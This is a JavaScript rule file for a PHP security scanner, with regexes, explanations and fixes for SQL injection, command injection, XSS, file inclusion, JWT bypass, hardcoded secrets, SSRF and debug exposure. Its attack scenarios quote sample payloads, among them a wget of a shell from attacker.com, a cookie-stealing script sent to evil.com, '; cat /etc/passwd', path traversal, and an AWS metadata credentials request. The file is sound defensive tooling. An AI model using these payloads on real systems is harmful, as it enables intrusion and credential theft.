/**
 * rules-php.js
 * Security rules for PHP.
 * Covers vanilla PHP, Laravel, WordPress patterns.
 */

const INJECTION_RULES = [
  {
    id: 'PHP-INJ-001',
    name: 'SQL Injection – string concatenation in query',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    // mysqli_query or similar with $_GET/$_POST concatenation
    pattern: /(?:mysqli_query|mysql_query|pg_query|mssql_query)\s*\([^)]*(?:\$_GET|\$_POST|\$_REQUEST|\$_COOKIE)[^)]*\)/g,
    why: 'User input from $_GET/$_POST is concatenated directly into the SQL query without sanitisation.',
    scenario: "An attacker enters ' OR '1'='1 in a form field and gains access to the entire database or can delete tables.",
    fix: "Use PDO with prepared statements: $stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $stmt->execute([$id]);",
    fileTypes: ['php'],
  },
  {
    id: 'PHP-INJ-002',
    name: 'SQL Injection – direct variable interpolation',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    // Matches when $_POST/$_GET/$_SESSION is concatenated DIRECTLY into the SQL string, e.g.:
    //   $SQL = "SELECT ... WHERE id = " . $_POST['id']
    //   $SQL = "DELETE FROM t WHERE id=" . $_GET['id']
    //   $SQL .= $_POST['name']
    //   $SQL .= ", col='" . $_SESSION['userId'] . "'"
    // Exkluderar (via antipattern):
    //   - korrekt parametriserad kod (sqlsrv_query med params, pdo->prepare, etc)
    //   - lines starting with // or inside /* */ block comments
    pattern: /\$(?:SQL|sql|query|qry|str)\s*(?:\.?=)\s*(?:[^;\n]{0,120}["\.\s]|["'])\s*\.\s*\$(?:_GET|_POST|_REQUEST|_COOKIE|_SESSION)\s*\[|\$(?:SQL|sql|query|qry)\s*\.=\s*\$(?:_GET|_POST|_REQUEST|_COOKIE|_SESSION)\s*\[/g,
    antipattern: /sqlsrv_query|mysqli_query|pg_query|\$(?:stmt|pdo|db|conn)->(?:prepare|execute|query)|^\s*(?:\/\/|#|\*)/i,
    lookahead: 200,
    why: 'PHP variables from superglobals (incl. $_SESSION) are concatenated directly into the SQL string without sanitisation.',
    scenario: 'An attacker sends id=1+OR+1=1 as a GET parameter. The SQL string becomes \"WHERE id=1 OR 1=1\" and returns all rows. $_SESSION can be manipulated via session fixation or other vectors.',
    fix: 'Use parameterised queries: $stmt = sqlsrv_query($link, "SELECT ... WHERE id=?", array($_POST["id"]));',
    fileTypes: ['php'],
  },
  {
    // PHP-INJ-002b: catches interpolation in double quotes – "SELECT ... $var"
    // Separate rule because the regex engine cannot handle the combination in one pattern
    id: 'PHP-INJ-002',
    name: 'SQL Injection – variable interpolation in SQL string',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    pattern: /["]\s*(?:SELECT|INSERT|UPDATE|DELETE|WHERE)[^"]{0,150}\$(?:_GET|_POST|_REQUEST|_COOKIE|_SESSION)\s*\[[^\]]+\][^"]{0,50}["]/gi,
    antipattern: /sqlsrv_query|mysqli_query|\$(?:stmt|pdo)->(?:prepare|execute)|^\s*(?:\/\/|#|\*)/i,
    lookahead: 200,
    why: 'PHP variables are interpolated directly into the SQL string via double quotes.',
    scenario: 'An attacker sends name=\" OR 1=1-- and the SQL query returns all records in the table.',
    fix: 'Never use variables directly in SQL strings. Use prepared statements with ? as placeholders.',
    fileTypes: ['php'],
  },
  {
    // PHP-INJ-002c: catches the assign-then-use pattern where a superglobal is
    // assigned to a local variable on the line(s) before it appears in SQL.
    // e.g.: $id = $_GET['id'];  →  $query = "SELECT ... WHERE id = " . $id;
    // Uses a large lookbehind (antipattern window) to check for superglobal assignment.
    // Matches: $query = "..." . $varname  where $varname is a common tainted variable name.
    id: 'PHP-INJ-002',
    name: 'SQL Injection – tainted variable concatenated into query',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    // Matches SQL string concatenation with local variables (not direct superglobals).
    // Common variable names used as tainted intermediaries.
    pattern: /\$(?:SQL|sql|query|qry|str)\s*(?:\.?=)\s*["'][^"']{0,200}(?:WHERE|FROM|INTO|SET|VALUES)[^"']{0,100}["']\s*\.\s*\$(?!_GET|_POST|_REQUEST|_COOKIE|_SESSION|stmt|pdo|conn|db)[a-zA-Z_]\w{0,30}\s*[;,"')/]/g,
    // Antipattern: safe if prepared statements are nearby, or if it's a comment
    antipattern: /sqlsrv_query|mysqli_query|pg_query|\$(?:stmt|pdo|db|conn)->(?:prepare|execute|query)|^\s*(?:\/\/|#|\*)/i,
    // Large lookbehind to catch superglobal assignment to local var earlier in function
    lookbehind: 400,
    lookahead: 50,
    why: 'A superglobal ($_GET/$_POST) is assigned to a local variable which is then concatenated into SQL without sanitisation.',
    scenario: 'Developer assigns $id = $_GET["id"] then uses $query = "SELECT ... WHERE id = " . $id — still vulnerable to injection.',
    fix: 'Use parameterised queries: $stmt = $pdo->prepare("SELECT * FROM t WHERE id = ?"); $stmt->execute([$_GET["id"]]);',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-INJ-003',
    name: 'Remote Code Execution – eval with user input',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    pattern: /eval\s*\(\s*(?:\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|base64_decode\s*\(\s*\$)/g,
    why: 'eval() executes arbitrary PHP code. With user input as the data source, RCE is inevitable.',
    scenario: 'Angripare skickar PHP-kod som parameter: ?code=system("wget attacker.com/shell.php"). Servern exekverar den.',
    fix: 'Never use eval() with external input. Replace with whitelisted operations or a proper template engine.',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-INJ-004',
    name: 'Command Injection – shell_exec / system with user input',
    severity: 'CRITICAL',
    category: 'Injection (OWASP A03)',
    pattern: /(?:shell_exec|system|exec|passthru|popen)\s*\(\s*(?:[^)]*\$(?:_GET|_POST|_REQUEST|_COOKIE)|[^)]*\.\s*\$(?:_GET|_POST|_REQUEST))/g,
    why: 'Shell commands are built with direct user input and executed on the server.',
    scenario: 'Angripare skickar "; cat /etc/passwd" som filnamnsparameter. Servern returnerar passwordsfilen.',
    fix: 'Use escapeshellarg() for all input and avoid shell functions entirely where possible.',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-INJ-005',
    name: 'XSS – unsanitised output of user input',
    severity: 'HIGH',
    category: 'Injection (OWASP A03)',
    pattern: /echo\s+(?:\$_GET|\$_POST|\$_REQUEST|\$_COOKIE)\s*\[/g,
    why: 'User input skrivs direkt till HTML-output utan escapning.',
    scenario: 'An attacker injects <script>document.location="https://evil.com?c="+document.cookie</script> via a parameter and steals cookies from visitors.',
    fix: 'Always use htmlspecialchars(): echo htmlspecialchars($_GET["name"], ENT_QUOTES, "UTF-8")',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-ERR-001',
    name: 'Information Disclosure – SQL query exposed on error',
    severity: 'HIGH',
    category: 'Security Misconfiguration (OWASP A05)',
    // Matchar: or die($SQL), or die($query), or die($sql), or die(mysql_error())
    // samt: || die($SQL), die($query . mysql_error()), print_r(sqlsrv_errors())
    pattern: /(?:or\s*die|or\s*exit|\|\|\s*die|\|\|\s*exit)\s*\(\s*\$(?:SQL|sql|query|qry)|die\s*\(\s*\$(?:SQL|sql|query|qry)|die\s*\([^)]*(?:mysql_error|sqlsrv_errors|pg_last_error|mssql_get_last_message)\s*\(\s*\)\s*\)/gi,
    why: 'The error handler prints the full SQL query or raw database error message directly in the HTTP response. An attacker receives table names, column names and SQL structure — greatly facilitating further SQL injection.',
    scenario: 'An attacker deliberately triggers a syntax error. The response contains: "You have an error in your SQL syntax near SELECT usr, password FROM users WHERE" — the database schema is now known.',
    fix: 'Logga felet server-side och visa ett generiskt meddelande: error_log(print_r(sqlsrv_errors(), true)); http_response_code(500); die("Ett internt fel uppstod.");',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-CMT-001',
    name: 'Commented-out insecure code – SQL injection pattern i kommentar',
    severity: 'MEDIUM',
    category: 'Security Misconfiguration (OWASP A05)',
    // Requires that BOTH the SQL variable AND the superglobal appear on the SAME commented line:
    //   // $SQL .= $_POST['id']                        ✓ matchar
    //   // $SQL = "SELECT ... WHERE id=" . $_GET['x']  ✓ matchar
    //   // $SQL="UPDATE t SET col='$_POST[x]'"         ✓ matchar
    //   // $SQL = "SELECT * FROM users";               ✗ matchar INTE (ingen superglobal)
    //   // echo $SQL;                                  ✗ matchar INTE
    //   //    }                                        ✗ matchar INTE
    pattern: /^\s*(?:\/\/|#|\/\*|\*)[^\n]{0,200}\$(?:SQL|sql|query|qry)[^\n]{0,150}\$(?:_GET|_POST|_REQUEST|_COOKIE|_SESSION)\s*\[/gm,
    why: 'Commented-out code with an SQL injection pattern remains in the codebase. The code is inactive but can be re-enabled by a developer unaware of the security risk. Its presence indicates a historically insecure pattern that was never replaced with a safe implementation.',
    scenario: 'A developer finds the commented-out code during debugging and removes the comment to "quickly test something". The code is now active and vulnerable — without anyone considering the security implications.',
    fix: 'Remove the commented-out code entirely. If the functionality is needed, implement it with prepared statements from the start. Commented-out insecure code is a liability that will sooner or later be re-enabled.',
    fileTypes: ['php'],
  },
];

const AUTH_RULES = [
  {
    id: 'PHP-AUTH-001',
    name: 'Password comparison with == instead of password_verify',
    severity: 'CRITICAL',
    category: 'Identification and Authentication Failures (OWASP A07)',
    pattern: /(?:\$_POST|\$_GET|\$_REQUEST)\s*\[['"](?:password|passwd|pwd)['"]]\s*==\s*\$\w+/gi,
    why: 'Loose comparisons (==) are vulnerable to type juggling attacks in PHP. password_verify() must always be used.',
    scenario: "PHP's == converts types: '0e123' == '0e456' is true because both are interpreted as 0 in scientific notation. An attacker can log in with a different password.",
    fix: 'Use password_verify($input, $hash) and password_hash($password, PASSWORD_BCRYPT) for storage.',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-AUTH-002',
    name: 'File inclusion with user input (LFI/RFI)',
    severity: 'CRITICAL',
    category: 'Broken Access Control (OWASP A01)',
    pattern: /(?:include|require|include_once|require_once)\s*(?:\(?\s*)(?:\$_GET|\$_POST|\$_REQUEST|\$_COOKIE)\s*\[/g,
    why: 'Filenames from user input are used in include/require — enabling Local/Remote File Inclusion.',
    scenario: 'An attacker sends ?page=../../../../etc/passwd and the server reads and returns system files. With RFI an attacker can include their own PHP file from an external server.',
    fix: 'Never use user input directly in include. Whitelist allowed pages: $allowed = ["home", "about"]; if(in_array($page, $allowed)) include $page . ".php";',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-AUTH-003',
    name: 'IDOR – databasee lookup without ownership check',
    severity: 'HIGH',
    category: 'Broken Access Control (OWASP A01)',
    pattern: /WHERE\s+id\s*=\s*(?:\$_GET|\$_POST|\$_REQUEST)\s*\[/gi,
    antipattern: /AND\s+(?:user_id|owner_id|created_by)/i,
    lookahead: 150,
    why: 'Database objects are fetched directly with an ID from the URL without checking whether the user owns the record.',
    scenario: 'A user with ID 5 changes the URL from ?id=5 to ?id=3 and views another user\'s data.',
    fix: 'Always add an ownership check: WHERE id = ? AND user_id = ? using the logged-in user\'s ID.',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-AUTH-004',
    name: 'IDOR – owner ID taken from $_POST without session verification',
    severity: 'HIGH',
    category: 'Broken Access Control (OWASP A01)',
    // Matchar: $uid = $_POST['userID']  eller  $pid = $_POST['projectID']
    // inkl. ternary: $uid = $x ? $_POST['userID'] : $_SESSION['y']
    //   → farligt eftersom an attacker kan styra den mobila grenen
    //
    // Antipattern (skip): $uid = $_SESSION[...] – direct assignment from session,
    //   not just the presence of $_SESSION in the same expression.
    pattern: /\$(?:pid|uid|user_id|owner_id|userId|ownerId|projectId|projekt_id)\s*=\s*(?:[^;\n]{0,200})?\$_POST\s*\[/gi,
    // Only skip if the variable is assigned DIRECTLY from $_SESSION (not via ternary)
    antipattern: /\$(?:pid|uid|user_id|owner_id|userId|ownerId|projectId|projekt_id)\s*=\s*\$_SESSION\s*\[/i,
    lookahead: 150,
    why: 'Owner ID (uid/pid) can be sourced from POST data controlled by the client. In mobile flows or conditional branches an attacker can send arbitrary IDs and operate on other users\' data.',
    scenario: 'A mobile client sends userID=7&projectID=3. The server uses these values directly as owner IDs without verifying against the logged-in session — an attacker deletes or reads another user\'s data.',
    fix: 'Always verify against $_SESSION: retrieve $_SESSION["user_id"] server-side and compare with or replace the POST-supplied ID. Never trust client-supplied owner identities.',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-AUTH-005',
    name: 'Password stored in plaintext in databasee',
    severity: 'CRITICAL',
    category: 'Identification and Authentication Failures (OWASP A07)',
    // Matches INSERT/UPDATE containing a password field and $password/$_POST['password']
    // without password_hash being called nearby
    pattern: /\$(?:SQL|sql|query)\s*(?:\.?=)[^;\n]{0,200}(?:password|passwd|pwd)\s*[='",.][^;\n]{0,100}\$(?:_GET|_POST|_REQUEST)\s*\[['"]\s*(?:password|passwd|pwd)/gi,
    antipattern: /password_hash|bcrypt|argon2|crypt\s*\(/i,
    lookahead: 300,
    why: 'The password from the form is stored directly in the database without hashing. In the event of a database breach all users\' passwords are exposed in plaintext.',
    scenario: 'An attacker with SELECT access to the database (via a separate SQL injection) dumps the entire user table and obtains all passwords in plaintext — including passwords reused on other services.',
    fix: 'Hasha alltid password med password_hash() innan lagring: $hash = password_hash($_POST["password"], PASSWORD_BCRYPT); Verifiera sedan med password_verify($input, $hash).',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-AUTH-006',
    name: 'Sensitive operations via $_GET (password/user data in URL)',
    severity: 'HIGH',
    category: 'Identification and Authentication Failures (OWASP A07)',
    // Matches when password or sensitive fields are sent as GET parameters
    pattern: /\$_GET\s*\[\s*['"]\s*(?:password|passwd|pwd|new_password|secret|token)\s*['"]\s*\]/gi,
    why: 'Passwords and sensitive values in GET parameters end up in server logs, browser history, proxy logs and Referer headers. They are visible to anyone with log access.',
    scenario: 'WS_addUser.php?usr=admin&password=secret123 appears in the Apache log, browser history, and is sent with the Referer header to external resources. Anyone with log access can see the password.',
    fix: 'Always use POST for passwords and sensitive operations. Never send passwords as URL parameters: use $_POST["password"] instead of $_GET["password"].',
    fileTypes: ['php'],
  },
];

const CRYPTO_RULES = [
  {
    id: 'PHP-CRYPTO-001',
    name: 'Weak password hashing algorithm (MD5/SHA1)',
    severity: 'HIGH',
    category: 'Cryptographic Failures (OWASP A02)',
    pattern: /(?:md5|sha1)\s*\(\s*(?:\$_POST|\$_GET|\$password|\$passwd|\$pwd)/gi,
    why: 'MD5 and SHA1 are cryptographically broken and unsuitable for password hashing.',
    scenario: 'An attacker with database access can crack MD5-hashed passwords using rainbow tables in seconds.',
    fix: 'Use password_hash($password, PASSWORD_BCRYPT) and password_verify($input, $hash).',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-CRYPTO-002',
    name: 'Hardcoded databasee password in configuration',
    severity: 'HIGH',
    category: 'Security Misconfiguration (OWASP A05)',
    pattern: /(?:DB_PASSWORD|db_password|mysql_password|MYSQL_PWD)\s*=\s*['"][^'"]{4,}['"]/gi,
    antipattern: /(?:getenv|env\(|\$_ENV)/,
    lookahead: 20,
    why: 'The database password is hardcoded in the source code and exposed in version control.',
    scenario: 'Anyone with repository access — including former employees — now has access to the production database.',
    fix: "Use an environment variable: define('DB_PASSWORD', getenv('DB_PASSWORD')); and store in .env outside git.",
    fileTypes: ['php'],
  },
];

module.exports = {
  INJECTION_RULES,
  AUTH_RULES,
  CRYPTO_RULES,
  ALL_RULES: [...INJECTION_RULES, ...AUTH_RULES, ...CRYPTO_RULES],
};

// ── JWT ───────────────────────────────────────────────────────────────────────

const JWT_RULES = [
  {
    id: 'PHP-JWT-001',
    name: 'JWT decoded without signature verification',
    severity: 'CRITICAL',
    category: 'Broken Authentication (OWASP A07)',
    // firebase/php-jwt: JWT::decode($token, null, ...) or with empty/null key
    // lcobucci/jwt: $config->parser()->parse($token) without validation
    pattern: /JWT\s*::\s*decode\s*\([^)]{0,200}(?:null\s*,|,\s*null\s*,|\[\s*\]|\bfalse\b)/gi,
    why: 'Calling JWT::decode() with a null key or empty key array skips signature verification. Any token with a valid structure is accepted regardless of who signed it.',
    scenario: 'AI passes null as the key argument to JWT::decode() during prototyping. The code ships. Attacker forges a token with ["role" => "admin", "user_id" => 1] and gains admin access.',
    fix: 'Always provide the key: JWT::decode($token, new Key($secretKey, "HS256")). Use firebase/php-jwt >= 6.0 which requires an explicit Key object. Store the secret key in environment variables, never in source code.',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-JWT-002',
    name: 'JWT algorithm "none" accepted — signature bypass',
    severity: 'CRITICAL',
    category: 'Broken Authentication (OWASP A07)',
    // Matches: ["none"], ["HS256", "none"], ['none', 'RS256'] in JWT context
    pattern: /(?:JWT|jwt|token|auth)[^;]{0,200}\[\s*['"]none['"]\s*\]|allowedAlgorithms[^;]{0,100}none/gi,
    why: 'Accepting "none" as a valid algorithm means tokens without signatures are trusted. This is a well-known attack against JWT libraries that do not explicitly reject the "none" algorithm.',
    scenario: 'Allowed algorithms array includes "none". Attacker takes a valid token, strips the signature, changes alg to "none" in the header, and modifies the payload. Server accepts it as legitimate.',
    fix: 'Use an explicit allowlist: ["HS256"] or ["RS256"]. Never include "none". With firebase/php-jwt, pass a Key object which enforces algorithm binding automatically.',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-JWT-003',
    name: 'JWT payload read by manual base64 decode — signature not verified',
    severity: 'HIGH',
    category: 'Broken Authentication (OWASP A07)',
    // Matches: explode('.', $token) followed by base64_decode
    pattern: /explode\s*\(\s*['"][.]?['"][^)]*\$\w*[Tt]oken[\s\S]{0,200}base64_decode|base64_decode[\s\S]{0,200}explode\s*\(\s*['"][.]['"][^)]*\$\w*[Tt]oken/gi,
    why: 'Splitting a JWT on "." and base64-decoding the payload reads the claims without verifying the HMAC signature. The payload is just base64url-encoded JSON — completely attacker-controlled.',
    scenario: 'Code does $parts = explode(".", $token); $payload = json_decode(base64_decode($parts[1])). Attacker creates a token with "admin": true in the payload. No signature check — any payload is trusted.',
    fix: 'Use a JWT library for all token operations. Never manually decode JWT parts. The signature is the only thing separating authenticated claims from attacker-crafted claims.',
    fileTypes: ['php'],
  },
];

module.exports.JWT_RULES = JWT_RULES;
module.exports.ALL_RULES = [...module.exports.ALL_RULES, ...JWT_RULES];

// ── Secrets ───────────────────────────────────────────────────────────────────

const SECRET_RULES = [
  {
    id: 'PHP-SECRET-001',
    name: 'Hardcoded API key or secret in source code',
    severity: 'CRITICAL',
    category: 'Security Misconfiguration (OWASP A05)',
    pattern: /(?:api[_-]?key|api[_-]?secret|app[_-]?secret|client[_-]?secret|access[_-]?token|auth[_-]?token|private[_-]?key)\s*=\s*['"][a-zA-Z0-9\-_\/+]{16,}['"]/gi,
    antipattern: /getenv|env\(|\$_ENV|\$_SERVER|\.env|\btest\b|\bmock\b|\bexample\b/i,
    lookahead: 60,
    why: 'Hardcoded secrets are exposed to everyone with repository access. Automated scanners harvest API keys from public repos within minutes of a push.',
    scenario: '$api_key = "sk-prod-abc123xyz..." committed to git. Repo becomes public. Within hours, the key is used to rack up charges on a third-party API or access customer data.',
    fix: '$api_key = getenv("API_KEY"); Store in .env (git-ignored) with vlucas/phpdotenv locally, and as environment variables in production hosting.',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-SECRET-002',
    name: 'Hardcoded JWT secret or HMAC key',
    severity: 'CRITICAL',
    category: 'Security Misconfiguration (OWASP A05)',
    // JWT::encode($payload, "hardcoded") or hash_hmac('sha256', $data, "hardcoded")
    pattern: /(?:JWT\s*::\s*encode\s*\(\s*[^,]+,\s*['"]\w[^'"]{7,}['"]|hash_hmac\s*\(\s*[^,]+,\s*[^,]+,\s*['"]\w[^'"]{7,}['"])\s*[,)]/gi,
    antipattern: /getenv|env\(|\$_ENV/i,
    lookahead: 40,
    why: 'A hardcoded JWT signing key means tokens can be forged by anyone with source code access. A hardcoded HMAC key undermines all integrity checks that rely on it.',
    scenario: 'JWT::encode($payload, "supersecret") in source. Attacker reads key from repo, forges tokens for any user ID or role. No rotation possible without invalidating all sessions and redeploying.',
    fix: '$secret = getenv("JWT_SECRET"); JWT::encode($payload, $secret, "HS256"). Generate with: php -r "echo bin2hex(random_bytes(64));"',
    fileTypes: ['php'],
  },
];

// ── Open redirect ─────────────────────────────────────────────────────────────

const REDIRECT_RULES = [
  {
    id: 'PHP-REDIRECT-001',
    name: 'Open redirect — unvalidated request parameter used in header redirect',
    severity: 'HIGH',
    category: 'Security Misconfiguration (OWASP A05)',
    // header("Location: " . $_GET['next']), header("Location: $_POST[url]")
    pattern: /header\s*\(\s*['"]Location\s*:[^'"]*['"]\s*\.\s*\$_(?:GET|POST|REQUEST|COOKIE)|header\s*\(\s*"Location:\s*\$_(?:GET|POST|REQUEST)/gi,
    why: 'Concatenating user input into a Location header gives attackers full control over the redirect destination, enabling phishing attacks under your domain.',
    scenario: 'header("Location: " . $_GET["next"]) after login. Attacker sends users to yoursite.com/login?next=https://evil.com. After authenticating, users land on the phishing page.',
    fix: '$next = $_GET["next"] ?? "/"; $parsed = parse_url($next); if (!empty($parsed["host"])) $next = "/"; header("Location: " . $next);',
    fileTypes: ['php'],
  },
];

// ── Path traversal ────────────────────────────────────────────────────────────

const PATH_RULES = [
  {
    id: 'PHP-PATH-001',
    name: 'Path traversal — user input used in file_get_contents or include',
    severity: 'CRITICAL',
    category: 'Broken Access Control (OWASP A01)',
    // file_get_contents($_GET['f']), include($_GET['page']), readfile($_POST['file'])
    pattern: /(?:file_get_contents|file_put_contents|readfile|include|require|include_once|require_once|fopen)\s*\(\s*(?:\$_(?:GET|POST|REQUEST|COOKIE)|[^;]{0,60}\$_(?:GET|POST|REQUEST))/gi,
    why: 'Passing user-supplied input to file functions or include statements allows reading arbitrary files (LFI) or in some configurations executing remote code (RFI).',
    scenario: 'include($_GET["page"] . ".php"). Attacker requests ?page=../../../../etc/passwd%00 (null byte truncation on older PHP) or ?page=http://evil.com/shell (RFI if allow_url_include is on).',
    fix: '$allowed = ["home", "about", "contact"]; $page = $_GET["page"] ?? "home"; if (!in_array($page, $allowed)) $page = "home"; include("pages/" . $page . ".php"); Use an explicit allowlist — never construct file paths from user input.',
    fileTypes: ['php'],
  },
];

module.exports.SECRET_RULES = SECRET_RULES;
module.exports.REDIRECT_RULES = REDIRECT_RULES;
module.exports.PATH_RULES = PATH_RULES;
module.exports.ALL_RULES = [...module.exports.ALL_RULES, ...SECRET_RULES, ...REDIRECT_RULES, ...PATH_RULES];

// ── SSRF (P3) ─────────────────────────────────────────────────────────────────

const SSRF_RULES = [
  {
    id: 'PHP-SSRF-001',
    name: 'SSRF — user-controlled URL passed to curl or file_get_contents',
    severity: 'HIGH',
    category: 'Server-Side Request Forgery (OWASP A10)',
    // curl_setopt($ch, CURLOPT_URL, $_GET['url']), file_get_contents($_POST['url'])
    pattern: /(?:curl_setopt\s*\([^,]+,\s*CURLOPT_URL\s*,\s*\$_(?:GET|POST|REQUEST)|file_get_contents\s*\(\s*\$_(?:GET|POST|REQUEST)(?!\s*\[['"](?:template|page|file)['"]))/gi,
    why: 'SSRF via curl or file_get_contents allows attackers to make the PHP server send requests to internal services — including cloud metadata endpoints, internal APIs, Redis, Elasticsearch, and other infrastructure not accessible from the internet. PHP\'s allow_url_fopen makes this particularly easy to exploit.',
    scenario: 'curl_setopt($ch, CURLOPT_URL, $_GET["url"]) to proxy images. Attacker sends ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/. Server returns AWS credentials. In on-premise environments: ?url=http://internal-admin:8080/api/users.',
    fix: '$url = $_GET["url"]; $parsed = parse_url($url); $allowed = ["cdn.example.com", "api.example.com"]; if (!in_array($parsed["host"], $allowed)) die("Forbidden"); Then use curl with CURLOPT_PROTOCOLS limited to CURLPROTO_HTTPS only.',
    fileTypes: ['php'],
  },
];

// ── Auth additions (P3) ───────────────────────────────────────────────────────

const AUTH_EXTRA_RULES = [
  {
    id: 'PHP-AUTH-007',
    name: 'Authentication based on unvalidated $_COOKIE value',
    severity: 'HIGH',
    category: 'Broken Authentication (OWASP A07)',
    // if ($_COOKIE['role'] == 'admin'), if ($_COOKIE['user_id'] == $id)
    // Direct use of cookie value for access control decisions
    pattern: /\$_COOKIE\s*\[['"][^'"]{2,}['"]\]\s*(?:==|===|!=|!==)\s*['"](?:admin|root|superuser|true|1|yes)|if\s*\([^)]{0,100}\$_COOKIE\s*\[['"](?:role|admin|is_admin|user_type|access|level|auth)['"]\]/gi,
    why: 'Cookie values are completely attacker-controlled — any user can set any cookie to any value using browser dev tools. Using $_COOKIE directly for authorization decisions without cryptographic validation (HMAC, JWT, or session lookup) gives attackers trivial privilege escalation.',
    scenario: 'if ($_COOKIE["role"] === "admin") — attacker opens DevTools, sets cookie role=admin, reloads. Full admin access without any credentials.',
    fix: 'Never trust cookie values directly for authorization. Store the role in the server-side session: $_SESSION["role"] = "admin" after verified authentication. If you must use cookies for state, sign them with hash_hmac and verify the signature before trusting the value.',
    fileTypes: ['php'],
  },
];

module.exports.SSRF_RULES       = SSRF_RULES;
module.exports.AUTH_EXTRA_RULES = AUTH_EXTRA_RULES;
module.exports.ALL_RULES        = [...module.exports.ALL_RULES, ...SSRF_RULES, ...AUTH_EXTRA_RULES];

// ── EXPOSURE-regler (PHP/Laravel/WordPress) ───────────────────────────────────

const EXPOSURE_RULES = [
  {
    id: 'PHP-EXPOSURE-001',
    name: 'PHP error display enabled — errors exposed to browser',
    severity: 'EXPOSURE',
    category: 'Security Misconfiguration (OWASP A05)',
    // ini_set('display_errors', 1), error_reporting(E_ALL) without logging
    pattern: /ini_set\s*\(\s*['"]display_errors['"]\s*,\s*['"]?1['"]?\s*\)|ini_set\s*\(\s*['"]display_errors['"]\s*,\s*true\s*\)/gi,
    why: 'display_errors=1 sends PHP error messages, warnings, and notices directly to the browser response. These messages expose file paths, variable values, SQL queries, and application structure to anyone who triggers an error — intentionally or not.',
    scenario: 'ini_set("display_errors", 1) left in from development. A malformed request triggers a databasee error: "SQLSTATE[42S02]: Table \'prod_db.users_v3\' doesn\'t exist" with the full file path. Attacker now knows the databasee name, table structure, and internal paths.',
    fix: 'In production: ini_set("display_errors", 0); error_reporting(E_ALL); ini_set("log_errors", 1); ini_set("error_log", "/var/log/php/errors.log"); Log everything, display nothing. Use a staging environment for debugging.',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-EXPOSURE-002',
    name: 'Laravel APP_DEBUG=true — debug mode in application config',
    severity: 'EXPOSURE',
    category: 'Security Misconfiguration (OWASP A05)',
    // APP_DEBUG=true in .env or config/app.php: 'debug' => true
    pattern: /['\"]debug['"]\s*=>\s*true|APP_DEBUG\s*=\s*true/gi,
    antipattern: /env\s*\(\s*['"]APP_DEBUG['"]/i,
    lookahead: 40,
    why: 'Laravel\'s debug mode exposes the Ignition error page which shows full stack traces, environment variables, request data, and config values on every unhandled exception. It also enables the debug bar which logs all SQL queries, session data, and route information.',
    scenario: 'APP_DEBUG=true deployed to production. User triggers a 500 error. Ignition page reveals: DB_PASSWORD, APP_KEY, full stack trace with internal paths, and all SQL queries executed during the request — fully visible to the user.',
    fix: 'In config/app.php: "debug" => env("APP_DEBUG", false). Ensure .env in production has APP_DEBUG=false or the variable is unset. The default false means a misconfigured deploy fails safe.',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-EXPOSURE-003',
    name: 'Laravel APP_KEY hardcoded or missing — encryption key in source',
    severity: 'EXPOSURE',
    category: 'Security Misconfiguration (OWASP A05)',
    // 'key' => 'base64:hardcoded...' in config/app.php, not from env()
    pattern: /['"']key['"']\s*=>\s*['"]base64:[A-Za-z0-9+\/=]{20,}['"]/g,
    antipattern: /env\s*\(\s*['"]APP_KEY['"]/i,
    lookahead: 40,
    why: 'Laravel APP_KEY is used to encrypt cookies, sessions, queued jobs, and all data passed through Laravel\'s Crypt facade. A hardcoded or leaked key allows attackers to decrypt all encrypted application data and forge signed cookies.',
    scenario: 'APP_KEY hardcoded in config/app.php, committed to git. Attacker decrypts all user session cookies, reads encrypted fields in the databasee, and forges remember_me tokens for any user ID.',
    fix: '"key" => env("APP_KEY") — this is the Laravel default. Generate a key: php artisan key:generate. Store only in .env (git-ignored) and production environment variables. Never commit the actual key value.',
    fileTypes: ['php'],
  },
  {
    id: 'PHP-EXPOSURE-004',
    name: 'WordPress databasee credentials or secret keys hardcoded in wp-config',
    severity: 'EXPOSURE',
    category: 'Security Misconfiguration (OWASP A05)',
    // define('DB_PASSWORD', 'hardcoded'), define('AUTH_KEY', 'hardcoded')
    pattern: /define\s*\(\s*['"](?:DB_PASSWORD|DB_USER|AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY|AUTH_SALT)['"]\s*,\s*['"][^'"]{8,}['"]\s*\)/gi,
    antipattern: /getenv|putenv|\$_ENV|\$_SERVER/i,
    lookahead: 40,
    why: 'WordPress stores databasee credentials and cryptographic salts directly in wp-config.php. If this file is accidentally exposed via a misconfigured server or included in a git repo, all credentials and session signing keys are compromised.',
    scenario: 'wp-config.php committed to a public GitHub repo. Attacker extracts DB_PASSWORD, connects directly to the MySQL databasee, dumps all user password hashes and personal data, and uses AUTH_KEY to forge WordPress authentication cookies.',
    fix: 'Load from environment: define("DB_PASSWORD", getenv("DB_PASSWORD")). Use a wp-config.php pattern that reads from environment variables, store actual values outside the webroot and outside version control. Consider using a plugin like WP Dotenv.',
    fileTypes: ['php'],
  },
];

module.exports.EXPOSURE_RULES     = EXPOSURE_RULES;
module.exports.ALL_EXPOSURE_RULES = EXPOSURE_RULES;
